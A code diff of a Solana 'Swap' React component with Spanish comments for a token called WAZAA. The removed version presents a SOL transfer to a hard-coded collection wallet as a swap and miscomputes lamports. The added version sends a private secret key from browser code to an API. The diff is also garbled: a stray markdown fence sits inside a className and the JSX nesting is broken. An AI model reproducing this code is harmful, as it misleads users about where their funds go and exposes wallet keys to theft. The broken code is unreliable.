@@ -1,6 +1,6 @@
 import { Button } from '@mui/material';
 import { useWallet } from '@solana/wallet-adapter-react';
-import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction } from '@solana/web3.js';
 import { Token, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import PropTypes from 'prop-types';
 import React, { useEffect, useState } from "react";
@@ -18,23 +18,25 @@ const Swap = ({ className = '' }) => {
 
         setIsLoading(true);
         try {
-            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-            const recipientPublicKey = new PublicKey('RECIPIENT_WALLET_ADDRESS'); // Tu billetera de recolección
-
-            // Crear y firmar la transacción
-            const transaction = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: wallet.publicKey,
-                    toPubkey: recipientPublicKey,
-                    lamports: amount * 1000000, // Asumiendo que la cantidad está en SOL
+            const response = await fetch('/api/send-spl-token', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    secretKey: 'YOUR_SECRET_KEY', // Tu llave secreta
+                    toPublicKey: 'RECIPIENT_WALLET_ADDRESS', // Tu billetera de recolección
+                    amount: amount,
+                    mint: 'YOUR_MINT_ADDRESS'
                 })
-            );
+            });
 
-            // Solicitar firma a la billetera Phantom
-            const { signature } = await wallet.sendTransaction(transaction, connection);
-            await connection.confirmTransaction(signature, 'confirmed');
-
-            alert('Swap successful');
+            const result = await response.json();
+            if (response.ok) {
+                alert('Swap successful: ' + result.transfer_transaction);
+            } else {
+                alert('Error during swap: ' + result.error);
+            }
         } catch (error) {
             console.error(error);
             alert('Error during swap');
@@ -136,6 +138,15 @@ const Swap = ({ className = '' }) => {
                                                 WAZAA
                                             </div>
                                         </div>
+                                   
+                                        <div className="flex flex-row items-end justify-start gap-[4px]">
+                                            <b className="relative leading-[20px] inline-block min-w-[65px] text-base">
+                                                12,466
+                                            </b>
+                                            <div className="relative leading-[20px] font-light inline-block min-w-[66px] text-base">
+                                                WAZAA
+                                            </div>
+                                        </div>
                                     </div>
                                     <div className="self-stretch flex flex-row items-center justify-between gap-[20px] flex-wrap">
                                         <div className="flex flex-row items-center justify-start">
@@ -144,13 +155,13 @@ const Swap = ({ className = '' }) => {
                                             </div>
                                         </div>
                                         <div className="flex flex-row items-center justify-end gap-[8px]">
-                                            <b className="relative leading-[16px] inline-block min```jsx
-                                                10
-                                            </b>
-                                            <div className="relative leading-[16px] inline-block min-w-[54px]">
-                                                WAZAA
-                                            </div>
+                                        <b className="relative leading-[16px] inline-block min-w-[18px]">
+                                            10
+                                        </b>
+                                        <div className="relative leading-[16px] inline-block min-w-[54px]">
+                                            WAZAA
                                         </div>
+                                    </div>
                                     </div>
                                     <div className="self-stretch flex flex-row items-center justify-between gap-[20px]">
                                         <div className="flex flex-row items-center justify-start">
@@ -167,44 +178,45 @@ const Swap = ({ className = '' }) => {
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                                <Button
-                                    className="self-stretch h-11"
-                                    endIcon={
-                                        <img width="24px" height="24px" src="/autorenew-1.svg" />
-                                    }
-                                    disableElevation
-                                    variant="contained"
-                                    sx={{
-                                        textTransform: "none",
-                                        color: "#222",
-                                        fontSize: "16",
-                                        background: "#14f195",
-                                        borderRadius: "44px",
-                                        "&:hover": { background: "#14f195" },
-                                        height: 44,
-                                    }}
-                                    onClick={handleSwap}
-                                    disabled={isLoading}
-                                >
-                                    Swap
-                                </Button>
-                            </div>
-                        </div>
-                        <div className="w-full lg:w-1/2 flex flex-col items-start justify-start pt-9 px-0 pb-0 box-border flex-wrap">
-                            <div className="self-stretch flex flex-row items-start justify-start relative">
-                                {/* Aquí se puede añadir contenido si es necesario */}
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-    );
-};
-
-Swap.propTypes = {
-    className: PropTypes.string,
-};
-
-export default Swap;
+                                    </div>
+                                    <Button
+                                        className="self-stretch h-11"
+                                        endIcon={
+                                            <img width="24px" height="24px" src="/autorenew-1.svg" />
+                                        }
+                                        disableElevation
+                                        variant="contained"
+                                        sx={{
+                                            textTransform: "none",
+                                            color: "#222",
+                                            fontSize: "16",
+                                            background: "#14f195",
+                                            borderRadius: "44px",
+                                            "&:hover": { background: "#14f195" },
+                                            height: 44,
+                                        }}
+                                        onClick={handleSwap}
+                                        disabled={isLoading}
+                                    >
+                                        Swap
+                                    </Button>
+                                    </div>
+                                    </div>
+                                    <div className="w-full lg:w-1/2 flex flex-col items-start justify-start pt-9 px-0 pb-0 box-border flex-wrap">
+                                        <div className="self-stretch flex flex-row items-start justify-start relative">
+                                            {/* Aquí se puede añadir contenido si es necesario */}
+                                        </div>
+                                    </div>
+                                    </div>
+                                    </div>
+                                    </div>
+                                    </section>
+                                    );
+                                    };
+                                    
+                                    Swap.propTypes = {
+                                    className: PropTypes.string,
+                                    };
+                                    
+                                    export default Swap;
+                                    
